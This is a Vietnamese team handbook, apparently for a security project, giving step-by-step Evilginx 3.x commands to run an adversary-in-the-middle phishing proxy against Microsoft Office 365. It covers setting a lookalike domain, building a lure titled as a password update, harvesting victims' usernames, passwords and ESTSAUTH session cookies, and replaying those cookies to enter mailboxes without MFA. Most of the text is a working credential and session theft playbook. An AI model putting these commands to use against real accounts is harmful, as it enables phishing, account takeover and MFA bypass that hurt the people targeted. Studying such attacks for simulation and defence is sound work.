# Cẩm Nang Vận Hành Phishlet Cho Quang & Hiếu (Evilginx 3.x)

Tài liệu này hướng dẫn chi tiết cách cấu hình, kiểm thử và vận hành kịch bản Phishlet **`mmq_o365`** phục vụ mô phỏng tấn công AiTM vượt MFA trên hệ thống Microsoft Office 365 / MMQ Mail.

---

## 1. Cấu Trúc File Phishlet Cốt Lõi: `mmq_o365.yaml`

File cấu hình tại [`Tools/Phishlets/mmq_o365.yaml`](mmq_o365.yaml) gồm các thành phần quan trọng:

* **`proxy_hosts`:** Danh sách các máy chủ của Microsoft cần proxy. Evilginx sẽ tự động sinh các subdomain tương ứng trên domain bẫy (ví dụ: `login.mmq-portal.dpdns.org`, `portal.mmq-portal.dpdns.org`).
* **`auth_tokens`:** Đây là "trọng tâm" vượt MFA. Phishlet cấu hình bắt 3 cookie sống còn:
  - `ESTSAUTH`: Token phiên đăng nhập xác thực chính.
  - `ESTSAUTHPERSISTENT`: Token duy trì phiên lâu dài (Persistent Session).
  - `SignInStateCookie`: Trạng thái luồng xác thực đa bước.
* **`force_post`:** Ép tham số `LoginOptions=1` (Keep Me Signed In) để máy chủ Microsoft luôn cấp cookie có thời hạn dài thay vì cookie tạm thời.

---

## 2. Quy Trình Vận Hành Từng Bước (Cheatsheet Lệnh Evilginx)

> **Lưu ý:** Trước khi chạy lệnh `enable`, cần đảm bảo **Lương An & Khanh** đã trỏ bản ghi NS của domain về IP máy chủ để Evilginx có thể tự xin chứng chỉ SSL/TLS miễn phí từ Let's Encrypt.

### Bước 1: Khởi động Evilginx với thư mục Phishlets
Từ thư mục dự án:
```bash
cd /home/kali/Project_IAO_MFA_bypass_by_reverse_proxy/Tools/Evilginx2
sudo ./build/evilginx -p ./phishlets
```

### Bước 2: Thiết lập thông số mạng chung
```text
: config domain <tên_miền_từ_Lương_An_và_Khanh>
(Ví dụ: config domain mmq-login.dpdns.org)

: config ipv4 <IP_Public_hoặc_IP_máy_chủ>
```

### Bước 3: Cấu hình và Kích hoạt Phishlet `mmq_o365`
```text
: phishlets hostname mmq_o365 mmq-login.dpdns.org
: phishlets enable mmq_o365
```
*(Nếu thành công, Evilginx sẽ tự động xin chứng chỉ SSL và hiển thị trạng thái `enabled: true`)*

### Bước 4: Tạo liên kết bẫy (Lure)
```text
: lures create mmq_o365
: lures edit 0 redirect_url https://outlook.office.com/mail/
: lures edit 0 og_title "MMQ Corporation - Cập nhật mật khẩu tài khoản"
: lures get-url 0
```
*(Link tạo ra sẽ có dạng: `https://login.mmq-login.dpdns.org/xxxxxx`)*

### Bước 5: Kiểm tra kết quả thu hoạch Cookie phiên
Khi nạn nhân bấm vào link và đăng nhập thành công:
```text
: sessions
: sessions <id>
```
Evilginx sẽ hiển thị chi tiết:
- Username & Password của nạn nhân.
- Khối JSON chứa toàn bộ Cookies (`ESTSAUTH`, `ESTSAUTHPERSISTENT`).

---

## 3. Cách Kiểm Chứng Bypass MFA Bằng Cookie-Editor

1. Mở một trình duyệt sạch (hoặc tab ẩn danh).
2. Cài đặt tiện ích mở rộng **Cookie-Editor** (trên Firefox/Chrome).
3. Truy cập vào trang web thật: `https://www.office.com`.
4. Mở **Cookie-Editor**, bấm **Import**, dán toàn bộ chuỗi JSON Cookie lấy từ lệnh `sessions <id>`.
5. Bấm **F5 (Refresh)**: Trình duyệt sẽ nhảy thẳng vào hòm thư hoặc cổng Office 365 mà **không hỏi lại mật khẩu hay mã MFA**!
